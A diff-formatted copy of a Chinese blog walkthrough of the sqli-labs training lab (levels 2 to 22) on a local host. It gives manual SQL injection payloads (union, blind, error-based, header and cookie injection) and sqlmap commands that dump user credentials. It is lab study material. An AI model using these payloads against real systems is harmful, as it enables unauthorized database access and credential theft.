+<p>第二个和第一个差不多,但是是数值型注入,把1后面的引号去掉就行</p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1 --+
+http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>接下来和less1一样</p>
+<p><strong>sqlmap</strong></p>
+<p>套less1的语句就行</p>
+<h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p> <strong>手动</strong></p>
+<p>先传id=1 好家伙</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194806106.png" alt="image-20210208194806106"></p>
+<p>要构造闭合,上一篇slq注入的文章写过</p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=1 --+
+http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>接下来的和上面一样操作</p>
+<p> <strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1') --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第一个还是可以</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194824485.png" alt="image-20210208194824485"></p>
+<h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p><strong>手动</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195001271.png" alt="image-20210208195001271"></p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-4/?id=1"
+和上面的类似,只需要闭合"")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>接下来和上面的操作一样</p>
+<p><strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-4/?id=1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p><strong>前面四题其实差不多,只是闭合符号的区别</strong></p>
+<h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>这题没有显位,所以判断是布尔盲注,时间盲注,或者是报错注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195017876.png" alt="image-20210208195017876"></p>
+<p><strong>手动</strong></p>
+<p>通过一个left函数来判断,一个一个去试太费时间了,可以用burp suite爆破</p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-5/?id=1' and left((select database()),2)="se" --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200311822.png" alt="image-20210208200311822"></p>
+<p>后面的就和前面差不多了</p>
+<p><strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">看下有哪些数据库
+python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql --dbs --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195053128.png" alt="image-20210208195053128"></p>
+<pre class="line-numbers language-none"><code class="language-none">查看security数据库的表
+python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security --tables --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195747622.png" alt="image-20210208195747622"></p>
+<pre class="line-numbers language-none"><code class="language-none">查看字段
+python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security -T users --columns --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195649270.png" alt="image-20210208195649270"></p>
+<pre class="line-numbers language-none"><code class="language-none">查看用户名和密码
+ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195813166.png" alt="image-20210208195813166"></p>
+<h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p>这题和上面less5差不多，就是闭合符号不一样，把单引号改成双引号就可以了</p>
+<h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><strong>手动</strong></p>
+<p>先确定是如何闭合的，如下</p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-7?id=1')) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195934527.png" alt="image-20210208195934527"></p>
+<p>根据提示，目测是对数据库文件进行操作，上传一个一句话木马试试(因为我是装在自己的电脑上的所以知道绝对路径)</p>
+<p><strong>sqlmap</strong></p>
+<p>布尔盲注直接跑</p>
+<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-7/?id=1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p><strong>手动</strong></p>
+<p>这题也是布尔盲注，payload和第五题差不多，可以用left函数或ASCII函数来一个一个来判断，还是用sqlmap舒服🤣</p>
+<p><strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u 'http://127.0.0.1/sqli-labs/Less-8/?id=1' --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>时间注入</p>
+<p><strong>手动</strong></p>
+<p>又是一个一个去试，可以采用ASCII函数采用二分法来找到正确的字符，然后配合sleep(5)函数来构造</p>
+<p><strong>sqlmap</strong></p>
+<p>把technique改成T来试试</p>
+<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u 'http://127.0.0.1/sqli-labs/Less-9/?id=1' --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p><strong>手动</strong></p>
+<p>还是时间注入,只是和上一题的拼接方式不一样</p>
+<p>先构造闭合，试了一下下面几个，马上就显示you are in了，说明没有被执行</p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-10/?id=1' and sleep(5)--+
 http://127.0.0.1/sqli-labs/Less-10/?id=1') and sleep(5)--+
-http://127.0.0.1/sqli-labs/Less-10/?id=1')) and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最终正确的闭合是</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-10/?id=1" and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就和上题less9一样操作了</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-10/?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195951851.png" alt="image-20210208195951851"></p><p>从这以后就全部变成post注入了</p><p><strong>手动</strong></p><pre class="line-numbers language-none"><code class="language-none">username部分
+http://127.0.0.1/sqli-labs/Less-10/?id=1')) and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>最终正确的闭合是</p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-10/?id=1" and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后就和上题less9一样操作了</p>
+<p><strong>sqlmap</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-10/?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195951851.png" alt="image-20210208195951851"></p>
+<p>从这以后就全部变成post注入了</p>
+<p><strong>手动</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">username部分
 username=admin' union select 1,database()# 把username换成admin,后面的操作就和第一题差不多了
 username=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
 username=1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'#
 username=1' union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#
 
 password可以随便输,因为后台已经注释掉了
-SELECT username, password FROM users WHERE username='1' union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#' and password='$passwd' LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200012353.png" alt="image-20210208200012353"></p><p><strong>sqlmap</strong></p><p>先buspsuite抓包，看看data数据的格式，然后再拿sqlmap跑就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200030999.png" alt="image-20210208200030999"></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-11/ --data "uname=admin &amp;passwd=admin &amp;submit=Submit" --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><p>不断尝试几次时候发现，这题和less11一模一样，只是闭合方式变了，变成了”）</p><h2 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h2><p><strong>手动</strong></p><p>发现用‘)闭合之后没有显示位，那就试试报错注入</p><p>尝试使用extractvalue()函数</p><p>直接extractvalue(1，database())好像有点问题，查略一番资料后发现加个concat就正常了</p><pre class="line-numbers language-none"><code class="language-none">username=1') and extractvalue(1,concat(1,database()))#
+SELECT username, password FROM users WHERE username='1' union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#' and password='$passwd' LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200012353.png" alt="image-20210208200012353"></p>
+<p><strong>sqlmap</strong></p>
+<p>先buspsuite抓包，看看data数据的格式，然后再拿sqlmap跑就可以了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200030999.png" alt="image-20210208200030999"></p>
+<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-11/ --data "uname=admin &amp;passwd=admin &amp;submit=Submit" --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><p>不断尝试几次时候发现，这题和less11一模一样，只是闭合方式变了，变成了”）</p>
+<h2 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h2><p><strong>手动</strong></p>
+<p>发现用‘)闭合之后没有显示位，那就试试报错注入</p>
+<p>尝试使用extractvalue()函数</p>
+<p>直接extractvalue(1，database())好像有点问题，查略一番资料后发现加个concat就正常了</p>
+<pre class="line-numbers language-none"><code class="language-none">username=1') and extractvalue(1,concat(1,database()))#
 username=1') and extractvalue(1,concat(1,(select (table_name) from information_schema.tables where table_schema=database() limit 0,1)))#
 username=1') and extractvalue(1,concat(1,(select (column_name) from information_schema.columns where table_name='users' limit 0,1)))#
-username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) from security.users limit 1,1)))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200352121.png" alt="image-20210208200352121"></p><p><strong>sqlmap</strong></p><p>因为之前已经抓过包,post请求应该是一样的,所以和命令和第十一题是一样</p><h2 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h2><p>和上一题一样，只是闭合变成了“</p><h2 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h2><p><strong>手动</strong></p><p>这题不能用报错注入，试试其他的吧</p><p>先试试数据库的长度</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200413051.png" alt="image-20210208200413051"></p><p>依旧使用left函数来判断</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200429516.png" alt="image-20210208200429516"></p><p>然后就是一个一个去试啦，也可以借助一些脚本，或者是burpsuite</p><p><strong>sqlmap</strong></p><p>然它自己去测吧，从结果来看，可以指定使用布尔盲注或者是时间盲注，这样子跑的会快一些</p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data "uname=admin &amp;passwd=admin &amp;submit=Submit" --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h2><p>和15题一样，只是闭合变成了”）</p><p>sqlmap的话用上面的跑不出了，在网上查到sqlmap默认的输出等级是1，这里把输出等级调高一点就好了</p><h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><p><strong>手动</strong></p><p>这一关开始看着有点懵，提示要重置密码</p><p>查看post内容，发现是在passwd处</p><p>我的理解是接收到用户POST提交的uname和passwd后，根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p><p>所以注入的时候要在这里，用户名的话就用admin吧</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200502414.png" alt="image-20210208200502414"></p><p>需要用到的是updatexml函数</p><pre class="line-numbers language-none"><code class="language-none">uname=admin&amp;passwd=123123' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1)),1)#&amp;sumit=Submit
-接下来的和前面差不多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h2><p><strong>手动</strong></p><p>登录失败只会显示ip地址,登录成功会显示user agent</p><p>随后发现username和password都被转义了,构造不了闭合条件</p><p>猜测可能可以通过user agent来注入,看了下源码,确实如此</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200520106.png" alt="image-20210208200520106"></p><p>谷歌的hackbar不知道为什么有点问题</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200534798.png" alt="image-20210208200534798"></p><p>直接用burpsuite试试</p><p>payload为</p><pre class="line-numbers language-none"><code class="language-none">' or updatexml(1,concat(0x7e,(database())),1) or '1' = '1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到已经爆出来了,接下来就是常规操作啦</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200642152.png" alt="image-20210208200642152"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h2><p><strong>手动</strong></p><p>输入正确会显示Referer,错误没有显示,这题基本上就是Referer这里存在注入</p><p>和18题一样,只是注入点不一样,用上一题的payload就行了</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200709726.png" alt="image-20210208200709726"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h2><p><strong>手动</strong></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200722575.png" alt="image-20210208200722575"></p><p>基本上就是cookie注入了</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200801021.png" alt="image-20210208200801021"></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200817248.png" alt="image-20210208200817248"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-20/" --cookie="uname=admin*"--dbms=MySQL --random-agent --flush-session --technique=B -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h2><p><strong>手动</strong></p><p>这题和上一题一样,就是把payload用base64编码了</p><p>把上一题的payload base64编码一下就是这题的payload了</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r 抓包保存的文件路径 --cookie uname=YWRtaW4%3D --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h2><p><strong>手动</strong></p><p>和上一题的一样,就是把闭合方式改成了双引号</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r 抓包保存的文件路径 --cookie uname=YWRtaW4= --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><hr><div class="reprint" id="reprint-statement"><div class="reprint__author"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-user">文章作者: </i></span><span class="reprint-info"><a href="/about" rel="external nofollow noreferrer">Amy</a></span></div><div class="reprint__type"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-link">文章链接: </i></span><span class="reprint-info"><a href="https://anwar211.top/2020/ba-chang-xue-xi/sqli-labs/">https://anwar211.top/2020/ba-chang-xue-xi/sqli-labs/</a></span></div><div class="reprint__notice"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-copyright">版权声明: </i></span><span class="reprint-info">本博客所有文章除特別声明外，均采用 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a> 许可协议。转载请注明来源 <a href="/about" target="_blank">Amy</a> !</span></div></div><script async defer>function navToReprintStatement(){$("html, body").animate({scrollTop:$("#reprint-statement").offset().top-80},800)}document.addEventListener("copy",(function(t){M.toast({html:'<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>'})}))</script><div class="tag_share" style="display:block"><div class="post-meta__tag-list" style="display:inline-block"><div class="article-tag"><a href="/tags/web/"><span class="chip bg-color">web</span></a></div></div><div class="post_share" style="zoom:80%;width:fit-content;display:inline-block;float:right;margin:-.15rem 0"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/share/css/share.min.css"><div id="article-share"></div></div></div></div></div><article id="prenext-posts" class="prev-next articles"><div class="row article-row"><div class="article col s12 m6" data-aos="fade-up"><div class="article-badge left-badge text-color"><i class="fas fa-chevron-left"></i>&nbsp;上一篇</div><div class="card"><a href="/2020/chang-jian-lou-dong/wen-jian-shang-chuan-lou-dong/"><div class="card-image"><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205421280.png" class="responsive-img" alt="文件上传漏洞"> <span class="card-title">文件上传漏洞</span></div></a><div class="card-content article-content"><div class="summary block-with-text"></div><div class="publish-info"><span class="publish-date"><i class="far fa-clock fa-fw icon-date"></i>2020-11-28 </span><span class="publish-author"><i class="fas fa-bookmark fa-fw icon-category"></i> <a href="/categories/CTF/" class="post-category">CTF</a></span></div></div><div class="card-action article-tags"><a href="/tags/web/"><span class="chip bg-color">web</span></a></div></div></div><div class="article col s12 m6" data-aos="fade-up"><div class="article-badge right-badge text-color">下一篇&nbsp;<i class="fas fa-chevron-right"></i></div><div class="card"><a href="/2020/chang-jian-lou-dong/sql-zhu-ru/"><div class="card-image"><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205152774.png" class="responsive-img" alt="sql注入原理及sqlmap的使用"> <span class="card-title">sql注入原理及sqlmap的使用</span></div></a><div class="card-content article-content"><div class="summary block-with-text"></div><div class="publish-info"><span class="publish-date"><i class="far fa-clock fa-fw icon-date"></i>2020-11-27 </span><span class="publish-author"><i class="fas fa-bookmark fa-fw icon-category"></i> <a href="/categories/CTF/" class="post-category">CTF</a></span></div></div><div class="card-action article-tags"><a href="/tags/web/"><span class="chip bg-color">web</span></a></div></div></div></div></article></div><script>$("#articleContent").on("copy",(function(e){if(void 0!==window.getSelection){var n=window.getSelection();if(!((""+n).length<Number.parseInt("20"))){var t=document.getElementsByTagName("body")[0],o=document.createElement("div");o.style.position="absolute",o.style.left="-99999px",t.appendChild(o),o.appendChild(n.getRangeAt(0).cloneContents()),"PRE"===n.getRangeAt(0).commonAncestorContainer.nodeName&&(o.innerHTML="<pre>"+o.innerHTML+"</pre>");var i=document.location.href;o.innerHTML+='<br />来源: Amy<br />文章作者: Amy<br />文章链接: <a href="'+i+'">'+i+"</a><br />本文章著作权归作者所有，任何形式的转载都请注明出处。",n.selectAllChildren(o),window.setTimeout((function(){t.removeChild(o)}),200)}}}))</script><script type="text/javascript" src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/codeBlock/codeBlockFuction.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/codeBlock/codeLang.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/codeBlock/codeCopy.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/codeBlock/codeShrink.js"></script></div><div id="toc-aside" class="expanded col l3 hide-on-med-and-down"><div class="toc-widget card" style="background-color:#fff"><div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div><div id="toc-content"></div></div></div></div><div id="floating-toc-btn" class="hide-on-med-and-down"><a class="btn-floating btn-large bg-color"><i class="fas fa-list-ul"></i></a></div><script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/tocbot/tocbot.min.js"></script><script>$((function(){tocbot.init({tocSelector:"#toc-content",contentSelector:"#articleContent",headingsOffset:-(.4*$(window).height()-45),collapseDepth:Number("0"),headingSelector:"h2, h3, h4"});let t=0;$("#toc-content a").each((function(){$(this).attr("href","#toc-heading-"+ ++t)})),t=0,$("#articleContent").children("h2, h3, h4").each((function(){$(this).attr("id","toc-heading-"+ ++t)}));let e=parseInt(.4*$(window).height()-64),n=$(".toc-widget");$(window).scroll((function(){$(window).scrollTop()>e?n.addClass("toc-fixed"):n.removeClass("toc-fixed")}));let o=$("#toc-aside"),i=$("#main-content");$("#floating-toc-btn .btn-floating").click((function(){o.hasClass("expanded")?(o.removeClass("expanded").hide(),i.removeClass("l9")):(o.addClass("expanded").show(),i.addClass("l9")),function(t,e){let n=$("#"+t);if(0===n.length)return;let o=n.width();o+=o>=450?21:o>=350&&o<450?18:o>=300&&o<350?16:14,$("#"+e).width(o)}("artDetail","prenext-posts")}))}))</script></main><footer class="page-footer bg-color"><div class="container row center-align" style="margin-bottom:15px!important"><div class="col s12 m8 l8 copy-right">Copyright&nbsp;&copy; <span id="year">2021</span> <span id="year">2021</span> <a href="/about" target="_blank">Amy</a> |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a> |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a><br>&nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span class="white-color">34k</span>&nbsp;字 <span id="busuanzi_container_site_pv">|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv" class="white-color"></span>&nbsp;次 </span><span id="busuanzi_container_site_uv">|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv" class="white-color"></span>&nbsp;人</span><br><span id="sitetime">载入运行时间...</span><script>function siteTime(){var e=864e5,t=new Date,n=t.getFullYear(),o=t.getMonth()+1,r=t.getDate(),a=t.getHours(),i=t.getMinutes(),l=t.getSeconds(),m=Date.UTC("2021","1","1","0","0","0"),M=Date.UTC(n,o,r,a,i,l)-m,g=Math.floor(M/31536e6),d=Math.floor(M/e-365*g),s=Math.floor((M-(365*g+d)*e)/36e5),u=Math.floor((M-(365*g+d)*e-36e5*s)/6e4),T=Math.floor((M-(365*g+d)*e-36e5*s-6e4*u)/1e3);"2021"==n?(document.getElementById("year").innerHTML=n,document.getElementById("sitetime").innerHTML="本站已安全运行 "+d+" 天 "+s+" 小时 "+u+" 分钟 "+T+" 秒"):(document.getElementById("year").innerHTML="2021 - "+n,document.getElementById("sitetime").innerHTML="本站已安全运行 "+g+" 年 "+d+" 天 "+s+" 小时 "+u+" 分钟 "+T+" 秒")}setInterval(siteTime,1e3)</script><br></div><div class="col s12 m4 l4 social-link social-statis"><a href="https://github.com/anwar211" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50"><i class="fab fa-github"></i> </a><a href="https://twitter.com/xxx" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/xxx" data-position="top" data-delay="50"><i class="fab fa-twitter"></i> </a><a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50"><i class="fas fa-rss"></i></a></div></div></footer><div class="progress-bar"></div><div id="searchModal" class="modal"><div class="modal-content"><div class="search-header"><span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span> <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字" class="search-input"></div><div id="searchResult"></div></div></div><script type="text/javascript">$((function(){!function(t,e,r){"use strict";$.ajax({url:t,dataType:"xml",success:function(t){var n=$("entry",t).map((function(){return{title:$("title",this).text(),content:$("content",this).text(),url:$("url",this).text()}})).get(),a=document.getElementById(e),s=document.getElementById(r);a.addEventListener("input",(function(){var t='<ul class="search-result-list">',e=this.value.trim().toLowerCase().split(/[\s\-]+/);s.innerHTML="",this.value.trim().length<=0||(n.forEach((function(r){var n=!0,a=r.title.trim().toLowerCase(),s=r.content.trim().replace(/<[^>]+>/g,"").toLowerCase(),i=r.url;i=0===i.indexOf("/")?r.url:"/"+i;var l=-1,c=-1,u=-1;if(""!==a&&""!==s&&e.forEach((function(t,e){l=a.indexOf(t),c=s.indexOf(t),l<0&&c<0?n=!1:(c<0&&(c=0),0===e&&(u=c))})),n){t+="<li><a href='"+i+"' class='search-result-title'>"+a+"</a>";var o=r.content.trim().replace(/<[^>]+>/g,"");if(u>=0){var h=u-20,f=u+80;h<0&&(h=0),0===h&&(f=100),f>o.length&&(f=o.length);var m=o.substr(h,f);e.forEach((function(t){var e=new RegExp(t,"gi");m=m.replace(e,'<em class="search-keyword">'+t+"</em>")})),t+='<p class="search-result">'+m+"...</p>"}t+="</li>"}})),t+="</ul>",s.innerHTML=t)}))}})}("/search.xml","searchInput","searchResult")}))</script><div id="backTop" class="top-scroll"><a class="btn-floating btn-large waves-effect waves-light" href="#!"><i class="fas fa-arrow-up"></i></a></div><script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/materialize/materialize.min.js"></script><script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/masonry/masonry.pkgd.min.js"></script><script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/aos/aos.min.js"></script><script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/scrollprogress/scrollProgress.min.js"></script><script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script><script 